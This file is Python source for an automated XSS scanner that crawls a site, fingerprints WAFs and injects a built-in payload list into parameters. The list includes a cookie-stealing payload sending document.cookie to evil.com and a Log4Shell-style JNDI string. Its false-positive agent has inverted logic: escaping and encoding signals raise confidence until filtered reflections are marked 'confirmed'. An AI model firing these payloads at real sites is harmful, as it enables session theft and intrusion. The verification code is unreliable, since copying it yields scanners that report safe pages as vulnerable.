"""
CyberShield Advanced XSS Scanner
Browser-based XSS detection with false positive verification agent
"""

import requests
import re
import time
import hashlib
from urllib.parse import urljoin, urlparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
import html

class AdvancedXSSScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        self.payloads = self._init_payloads()
        self.dom_sinks = self._init_dom_sinks()
        self.waf_patterns = self._init_waf_patterns()
        
    def _init_payloads(self):
        return {
            'reflected': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "javascript:alert('XSS')",
                "'><script>alert('XSS')</script>",
                "\"><script>alert('XSS')</script>",
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
                "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
            ],
            'polyglot': [
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt>--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",
                "\"'><script>alert(String.fromCharCode(88,83,83))</script>",
                "<scrİpt>alert('XSS')</scrİpt>",
                "<ScRiPt>alErT('XSS')</sCrIpT>",
            ],
            'dom': [
                "{{constructor.constructor('alert(\"XSS\")')()}}",
                "{{$on.constructor('alert(\"XSS\")')()}}",
                "${alert('XSS')}",
                "{{alert('XSS')}}",
                "<%= alert('XSS') %>",
                "#{alert('XSS')}",
                "${jndi:ldap://xss}",
            ],
            'stored': [
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror=alert(document.domain)>",
                "<svg onload=fetch('http://evil.com?c='+document.cookie)>",
            ]
        }
    
    def _init_dom_sinks(self):
        return [
            'innerHTML', 'outerHTML', 'insertAdjacentHTML',
            'document.write', 'document.writeln',
            'eval', 'Function', 'setTimeout', 'setInterval',
            'location.href', 'location.hash', 'location.search',
            'document.cookie', 'document.referrer',
        ]
    
    def _init_waf_patterns(self):
        return {
            'cloudflare': ['__cfduid', 'Cloudflare', 'cloudflare'],
            'akamai': ['akamai', 'AKAMAI', 'AkamaiGHost'],
            'aws_waf': ['AWSWAF', 'aws-waf'],
            'imperva': ['Imperva', 'Incapsula'],
            'f5_asm': ['F5 Networks', 'BIG-IP'],
            'fortiweb': ['FortiWeb', 'FortiGate'],
            'sucuri': ['Sucuri', 'CloudProxy'],
            'wordfence': ['Wordfence', 'wordfence'],
            'generic': ['WAF', 'Web Application Firewall', 'Request blocked'],
        }
    
    def scan(self, url, options=None):
        """Main XSS scanning function"""
        options = options or {}
        results = {
            'url': url,
            'findings': [],
            'verified': [],
            'false_positives_removed': [],
            'waf_detected': None,
            'scan_stats': {}
        }
        
        start_time = time.time()
        
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = self._extract_params(url)
        
        results['waf_detected'] = self._detect_waf(url)
        
        if options.get('crawl', True):
            discovered_urls = self._crawl_site(url, depth=2)
        else:
            discovered_urls = [(url, params)]
        
        for target_url, target_params in discovered_urls:
            if not target_params:
                target_params = self._extract_params(target_url)
            
            for param_name, param_value in target_params.items():
                findings = self._test_parameter(target_url, param_name, param_value)
                results['findings'].extend(findings)
        
        if options.get('verify', True):
            results['verified'] = self._verify_findings(results['findings'])
            results['false_positives_removed'] = [
                f for f in results['findings'] 
                if f['url'] not in [v['url'] for v in results['verified']]
            ]
        
        results['scan_stats'] = {
            'duration': time.time() - start_time,
            'total_tests': len(results['findings']),
            'verified': len(results['verified']),
            'false_positives': len(results['false_positives_removed'])
        }
        
        return results
    
    def _extract_params(self, url):
        """Extract URL parameters"""
        parsed = urlparse(url)
        params = {}
        if parsed.query:
            for pair in parsed.query.split('&'):
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    params[key] = value
        return params
    
    def _crawl_site(self, url, depth=2):
        """Crawl site to find more URLs"""
        discovered = []
        visited = set()
        to_visit = [(url, self._extract_params(url))]
        
        while to_visit and len(visited) < 50:
            current_url, params = to_visit.pop(0)
            
            if current_url in visited:
                continue
            visited.add(current_url)
            
            discovered.append((current_url, params))
            
            if depth > 0:
                try:
                    r = self.session.get(current_url, timeout=10, verify=False)
                    soup = BeautifulSoup(r.text, 'html.parser')
                    
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        full_url = urljoin(url, href)
                        
                        if urlparse(url).netloc in urlparse(full_url).netloc:
                            if full_url not in visited:
                                to_visit.append((full_url, self._extract_params(full_url)))
                    
                    for form in soup.find_all('form'):
                        form_action = urljoin(current_url, form.get('action', ''))
                        form_params = {
                            inp.get('name', ''): inp.get('value', '')
                            for inp in form.find_all(['input', 'textarea'])
                            if inp.get('name')
                        }
                        if form_action not in visited:
                            discovered.append((form_action, form_params))
                            to_visit.append((form_action, form_params))
                            
                except:
                    pass
        
        return discovered[:20]
    
    def _detect_waf(self, url):
        """Detect WAF on target"""
        test_payload = "<script>alert('WAF-TEST')</script>"
        test_url = f"{url}?q={quote(test_payload)}"
        
        try:
            r = self.session.get(test_url, timeout=10, verify=False)
            content = r.text.lower()
            headers = str(r.headers).lower()
            
            for waf_name, patterns in self.waf_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in content or pattern.lower() in headers:
                        return {
                            'name': waf_name,
                            'detected': True,
                            'pattern': pattern
                        }
            
            if r.status_code == 403:
                return {'name': 'unknown', 'detected': True, 'pattern': '403 Forbidden'}
            
            return {'name': None, 'detected': False}
            
        except:
            return {'name': None, 'detected': False}
    
    def _test_parameter(self, url, param_name, param_value):
        """Test a single parameter for XSS"""
        findings = []
        unique_id = hashlib.md5(f"{url}{param_name}{time.time()}".encode()).hexdigest()[:8]
        
        for category, payloads in self.payloads.items():
            for payload_template in payloads:
                payload = payload_template.replace('XSS', f'XSS-{unique_id}')
                payload = payload.replace('alert', f'alert')
                
                test_url = f"{url}?{param_name}={quote(payload)}"
                
                try:
                    r = self.session.get(test_url, timeout=5, verify=False)
                    content = r.text
                    
                    if self._is_reflected(payload, content):
                        finding = {
                            'url': test_url,
                            'parameter': param_name,
                            'payload': payload,
                            'category': category,
                            'unique_id': unique_id,
                            'context': self._get_context(content, payload),
                            'reflection_type': self._analyze_reflection(payload, content),
                        }
                        
                        if self._is_exploitable(finding):
                            findings.append(finding)
                            
                except:
                    pass
        
        return findings
    
    def _is_reflected(self, payload, content):
        """Check if payload is reflected in response"""
        if payload in content:
            return True
        
        encoded_payloads = [
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('<', '%3c').replace('>', '%3e'),
            payload.replace('<', '%3C').replace('>', '%3E'),
        ]
        
        for encoded in encoded_payloads:
            if encoded in content:
                return True
        
        return False
    
    def _get_context(self, content, payload):
        """Get the context where payload is reflected"""
        for pattern in [payload, payload.replace('<', '&lt;'), payload.replace('<', '%3c')]:
            idx = content.find(pattern)
            if idx >= 0:
                start = max(0, idx - 50)
                end = min(len(content), idx + len(pattern) + 50)
                return content[start:end]
        return ""
    
    def _analyze_reflection(self, payload, content):
        """Analyze how payload is reflected"""
        unique_id = payload.split('XSS-')[1][:8] if 'XSS-' in payload else ""
        
        checks = {
            'html_tag': False,
            'html_entity': False,
            'url_encoded': False,
            'javascript': False,
            'attribute': False,
            'comment': False,
            'script': False,
        }
        
        if f'<script' in content and unique_id in content:
            checks['script'] = True
            checks['html_tag'] = True
        
        if '&lt;' in content and unique_id in content:
            checks['html_entity'] = True
        
        if '%3c' in content.lower() or '%3e' in content.lower():
            checks['url_encoded'] = True
        
        if re.search(r'<[^>]+on\w+\s*=', content, re.I):
            checks['attribute'] = True
        
        if 'javascript:' in content:
            checks['javascript'] = True
        
        if '<!--' in content and unique_id in content:
            checks['comment'] = True
        
        return checks
    
    def _is_exploitable(self, finding):
        """Check if reflected XSS is exploitable"""
        ctx = finding['reflection_type']
        payload = finding['payload']
        
        if ctx['script'] and '<script' in payload:
            return True
        
        if ctx['attribute'] and any(tag in payload for tag in ['onerror', 'onload', 'onclick']):
            return True
        
        if ctx['javascript'] and 'javascript:' in payload:
            return True
        
        if ctx['html_tag'] and ('<img' in payload or '<svg' in payload or '<iframe' in payload):
            return True
        
        if not any(ctx.values()):
            return False
        
        if not ctx['html_entity']:
            return True
        
        return False
    
    def _verify_findings(self, findings):
        """Verify findings using advanced techniques"""
        verified = []
        
        for finding in findings:
            if self._verify_xss(finding):
                verified.append(finding)
        
        return verified
    
    def _verify_xss(self, finding):
        """Deep verification of XSS finding"""
        url = finding['url']
        payload = finding['payload']
        unique_id = finding.get('unique_id', '')
        
        tests_passed = 0
        total_tests = 0
        
        try:
            r_baseline = self.session.get(url, timeout=5, verify=False)
            baseline_content = r_baseline.text
            
            test_payload = f"TESTING{unique_id if unique_id else 'XSS123'}"
            parsed = urlparse(url)
            
            import urllib.parse
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            param_part = parsed.query.split('=')[0] if parsed.query else finding['parameter']
            test_url = f"{base}?{param_part}={urllib.parse.quote(test_payload)}"
            
            r_test = self.session.get(test_url, timeout=5, verify=False)
            test_content = r_test.text
            
            if test_payload in test_content:
                tests_passed += 1
            total_tests += 1
            
            if unique_id in baseline_content:
                tests_passed += 1
            total_tests += 1
            
            for char in ['<', '>', '"', "'"]:
                special_payload = f"TESTING{unique_id}{char}"
                test_url = f"{base}?{param_part}={urllib.parse.quote(special_payload)}"
                r_special = self.session.get(test_url, timeout=5, verify=False)
                
                if special_payload in r_special.text:
                    tests_passed += 1
                total_tests += 1
            
        except:
            pass
        
        confidence = (tests_passed / total_tests * 100) if total_tests > 0 else 0
        
        finding['verification'] = {
            'passed': tests_passed,
            'total': total_tests,
            'confidence': confidence,
            'verified': confidence > 50
        }
        
        return confidence > 50


class FalsePositiveAgent:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def analyze(self, findings):
        """Analyze findings to identify false positives"""
        results = {
            'confirmed': [],
            'false_positives': [],
            'uncertain': [],
            'analysis': {}
        }
        
        for finding in findings:
            analysis = self._analyze_single(finding)
            finding['analysis'] = analysis
            
            if analysis['is_false_positive']:
                results['false_positives'].append(finding)
            elif analysis['is_confirmed']:
                results['confirmed'].append(finding)
            else:
                results['uncertain'].append(finding)
        
        results['analysis'] = {
            'total': len(findings),
            'confirmed': len(results['confirmed']),
            'false_positives': len(results['false_positives']),
            'uncertain': len(results['uncertain']),
            'accuracy_score': len(results['confirmed']) / len(findings) * 100 if findings else 0
        }
        
        return results
    
    def _analyze_single(self, finding):
        """Analyze a single finding for false positive"""
        analysis = {
            'is_false_positive': False,
            'is_confirmed': False,
            'confidence': 0,
            'reasons': []
        }
        
        payload = finding.get('payload', '')
        url = finding.get('url', '')
        context = finding.get('context', '')
        reflection_type = finding.get('reflection_type', {})
        
        if not payload:
            analysis['is_false_positive'] = True
            analysis['reasons'].append('Empty payload')
            return analysis
        
        unique_id = payload.split('XSS-')[1][:8] if 'XSS-' in payload else ""
        
        if unique_id and unique_id not in context and unique_id not in url:
            analysis['is_false_positive'] = True
            analysis['reasons'].append('Unique ID not found in context')
            return analysis
        
        if reflection_type.get('html_entity'):
            analysis['reasons'].append('HTML entity encoded - may be filtered')
            analysis['confidence'] += 30
        
        if reflection_type.get('url_encoded'):
            analysis['reasons'].append('URL encoded - may be filtered')
            analysis['confidence'] += 20
        
        html_tags = ['<script', '<img', '<svg', '<iframe', '<body']
        if any(tag in payload for tag in html_tags):
            if not reflection_type.get('html_tag'):
                analysis['is_false_positive'] = True
                analysis['reasons'].append('HTML tags not preserved in reflection')
                return analysis
        
        if payload.startswith("javascript:"):
            if not reflection_type.get('javascript'):
                analysis['is_false_positive'] = True
                analysis['reasons'].append('javascript: protocol not preserved')
                return analysis
        
        dangerous_chars = ['<', '>']
        safe_chars = ['&lt;', '&gt;', '%3c', '%3e']
        
        has_dangerous = any(c in payload for c in dangerous_chars)
        has_safe = any(s in context for s in safe_chars)
        
        if has_dangerous and has_safe:
            analysis['reasons'].append('Characters appear to be escaped')
            analysis['confidence'] += 40
        
        analysis['confidence'] = min(100, analysis['confidence'])
        
        if analysis['confidence'] >= 70:
            analysis['is_confirmed'] = True
        elif analysis['confidence'] <= 30:
            analysis['is_false_positive'] = True
        
        return analysis
    
    def verify_with_browser_context(self, url, payload):
        """Verify XSS by checking if it executes in browser-like context"""
        try:
            r = self.session.get(url, timeout=5, verify=False)
            content = r.text
            
            if payload not in content:
                return {'verified': False, 'reason': 'Payload not reflected'}
            
            dangerous_in_content = []
            for char in ['<', '>']:
                if char in payload and char in content:
                    dangerous_in_content.append(char)
            
            if len(dangerous_in_content) < len([c for c in payload if c in ['<', '>']]):
                return {'verified': False, 'reason': 'Characters filtered'}
            
            return {'verified': True, 'reason': 'Characters preserved'}
            
        except Exception as e:
            return {'verified': False, 'reason': str(e)}
    
    def generate_report(self, analysis_results):
        """Generate a detailed false positive analysis report"""
        report = []
        report.append("=" * 60)
        report.append("XSS SCANNER - FALSE POSITIVE ANALYSIS REPORT")
        report.append("=" * 60)
        report.append("")
        report.append(f"Total Findings: {analysis_results['analysis']['total']}")
        report.append(f"Confirmed: {analysis_results['analysis']['confirmed']}")
        report.append(f"False Positives: {analysis_results['analysis']['false_positives']}")
        report.append(f"Uncertain: {analysis_results['analysis']['uncertain']}")
        report.append(f"Accuracy Score: {analysis_results['analysis']['accuracy_score']:.1f}%")
        report.append("")
        
        if analysis_results['confirmed']:
            report.append("-" * 60)
            report.append("CONFIRMED VULNERABILITIES:")
            report.append("-" * 60)
            for f in analysis_results['confirmed']:
                report.append(f"\n  URL: {f.get('url', 'N/A')[:80]}")
                report.append(f"  Payload: {f.get('payload', 'N/A')[:60]}")
                report.append(f"  Confidence: {f.get('analysis', {}).get('confidence', 0):.0f}%")
        
        if analysis_results['false_positives']:
            report.append("")
            report.append("-" * 60)
            report.append("FALSE POSITIVES (REMOVED):")
            report.append("-" * 60)
            for f in analysis_results['false_positives']:
                report.append(f"\n  URL: {f.get('url', 'N/A')[:80]}")
                report.append(f"  Reason: {', '.join(f.get('analysis', {}).get('reasons', ['Unknown']))}")
        
        return "\n".join(report)


def scan_url_advanced(url, verify=True):
    """High-level function for advanced XSS scanning"""
    scanner = AdvancedXSSScanner()
    agent = FalsePositiveAgent()
    
    results = scanner.scan(url, options={
        'crawl': True,
        'verify': verify
    })
    
    if verify:
        analysis = agent.analyze(results.get('verified', results.get('findings', [])))
        results['analysis'] = analysis
        results['agent_report'] = agent.generate_report(analysis)
    
    return results
